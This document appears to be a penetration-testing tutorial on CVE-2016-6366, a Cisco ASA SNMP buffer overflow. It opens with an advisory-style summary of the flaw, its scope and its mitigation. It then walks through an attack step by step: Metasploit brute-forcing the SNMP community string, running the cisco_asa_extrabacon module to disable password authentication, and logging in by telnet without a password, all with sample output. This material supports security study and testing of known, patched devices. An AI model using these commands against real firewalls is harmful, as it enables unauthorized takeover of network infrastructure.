### Cisco ASA - CVE-2016-6366

**Overview:**
A vulnerability in the Simple Network Management Protocol (SNMP) code of Cisco Adaptive Security Appliance (ASA) Software could allow an authenticated, remote attacker to cause a reload of the affected system or to remotely execute code. This vulnerability is due to a buffer overflow in the affected code area and affects all versions of SNMP (versions 1, 2c, and 3) when enabled on a virtual or physical Cisco ASA device.

**Exploitation:**
An attacker can exploit this vulnerability by sending crafted SNMP packets to an SNMP-enabled interface on the affected system. If successful, the attacker can execute arbitrary code and obtain full control of the system or cause a reload of the affected system. The attacker must know the SNMP community string for SNMP versions 1 and 2c, or have a valid username and password for SNMP version 3.

**Affected Configurations:**
- **Traffic:** Only traffic directed to the affected system can be used to exploit this vulnerability.
- **Modes:** This vulnerability affects systems configured in routed and transparent firewall modes, and in single or multiple context modes.
- **IP Version:** The vulnerability can be triggered by IPv4 traffic only.

**Mitigation:**
Cisco has released software updates that address this vulnerability. Additional mitigations are listed in the Workarounds section of the advisory.

## How to Log In to Cisco ASA

If you are unfamiliar with the Cisco ASA device, use tools like [nmap](https://nmap.org/) or custom methods to discover useful information. If SNMP is enabled, you can attempt to crack the password using Metasploit.

```bash
msf auxiliary(snmp_login) > set PASSWORD public
PASSWORD => public
msf auxiliary(snmp_login) > set RHOSTS 192.168.206.114
RHOSTS => 192.168.206.114
msf auxiliary(snmp_login) > run
[+] 192.168.206.114:161 - LOGIN SUCCESSFUL: public (Access level: read-write); Proof (sysDescr.0): Cisco Adaptive Security Appliance Version 9.2(1)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Once you have the SNMP community string, you can use CVE-2016-6366 to exploit the remote Cisco device.

```bash
msf auxiliary(cisco_asa_extrabacon) > show options
Module options (auxiliary/admin/cisco/cisco_asa_extrabacon):
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMUNITY  public           yes       SNMP Community String
   MODE       pass-disable     yes       Enable or disable the password auth functions (Accepted: pass-disable, pass-enable)
   RETRIES    1                yes       SNMP Retries
   RHOST      192.168.206.114  yes       The target address
   RPORT      161              yes       The target port
   TIMEOUT    1                yes       SNMP Timeout
msf auxiliary(cisco_asa_extrabacon) > run
[*] Building pass-disable payload for version 9.2(1)...
[*] Sending SNMP payload...
[+] Clean return detected!
[!] Don't forget to run pass-enable after logging in!
[*] Auxiliary module execution completed
```

If the exploit is successful, you can log in to the Cisco device using telnet without a password.

```bash
$ telnet 192.168.206.114
ciscoasa> ?
  clear       Reset functions
  enable      Turn on privileged commands
  exit        Exit from the EXEC
  help        Interactive help for commands
  login       Log in as a particular user
  logout      Exit from the EXEC
  no          Negate a command or set its defaults
  ping        Send echo messages
  quit        Exit from the EXEC
  show        Show running system information
  traceroute  Trace route to destination
```
